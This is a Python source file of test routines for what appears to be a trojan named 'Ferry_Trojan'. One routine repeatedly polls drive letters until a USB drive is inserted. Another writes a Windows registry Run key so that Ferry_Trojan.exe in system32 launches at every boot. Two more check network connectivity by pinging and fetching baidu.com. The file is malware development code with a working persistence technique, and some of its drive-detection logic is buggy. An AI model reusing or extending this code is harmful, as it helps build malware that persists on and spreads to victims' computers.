# -*- coding: utf-8 -*-

import os
import urllib.request
import win32file,winreg
from time import sleep
import threading

drive_all=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\",  
                        "J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",  
                        "S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]

def test1():
        drive=[]
        
        for i in range(25):
                if win32file.GetDriveType(drive_all[i])==2:
                        break
        drive.append(drive_all[i])
        print(drive_all[i])
def test2(): 
    #修改注册表将程序改为开机启动  
    key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_WRITE)  
    winreg.SetValueEx(key,"Ferry_Trojan",0,winreg.REG_SZ,r'C:/WINDOWS/system32/Ferry_Trojan.exe') 
def test3():
        exit_code = os.system('ping www.baidu.com')
        if exit_code:
                raise Exception('connect failed.')
        print(exit_code)
def test4():
         exit_net=urllib.request.urlopen('http://www.baidu.com')
         print(exit_net)
def test5():
        global timer
        for item in drive_all:
                if (win32file.GetDriveType(item)==2):
                        break
        if os.path.isdir(item):
                print("found U-disk")
        else:
                print("not found U-disk")
                timer=threading.Timer(5.5,test5)
                timer.start()
        



def main():
        test5()

if __name__ == '__main__':
        main()